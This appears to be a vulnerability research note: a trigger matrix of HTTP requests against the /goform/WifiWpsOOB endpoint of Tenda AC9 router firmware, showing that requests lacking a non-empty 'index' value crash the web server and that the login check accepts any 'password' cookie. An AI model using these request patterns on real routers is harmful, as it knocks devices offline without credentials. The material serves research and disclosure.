# Trigger matrix

Tenda AC9 V1.0 V15.03.05.19 (6318), `/goform/WifiWpsOOB`. One fresh device instance per row.

| Request | Response | httpd |
| --- | --- | --- |
| POST, empty body | timeout, no response | exited 139 |
| POST `foo=1` (no `index`) | empty | dead |
| POST `index=` (empty value) | empty | dead |
| POST `index` (no `=`) | empty | dead |
| POST `index=1` | 200 OK | alive |
| GET, no parameters | empty | dead |
| POST, no cookie | 302 Redirect | alive |
| POST, `Cookie: password=zzz` | empty | dead |
| POST, `Content-Length: 999` with a 5-byte body | timeout | alive |

Notes:

- Rows 1-4 and 6 all crash, so the trigger is any request that does not carry a non-empty
  `index`: absent, empty, malformed, or no body at all.
- Row 5 confirms a well-formed request is handled normally.
- Rows 7 and 8 show the authentication gate only checks that a `password` cookie exists. The
  value is not validated, so no credentials are needed.
- Row 9: a `Content-Length` mismatch alone does not trigger anything. The server waits for
  the rest of the body.
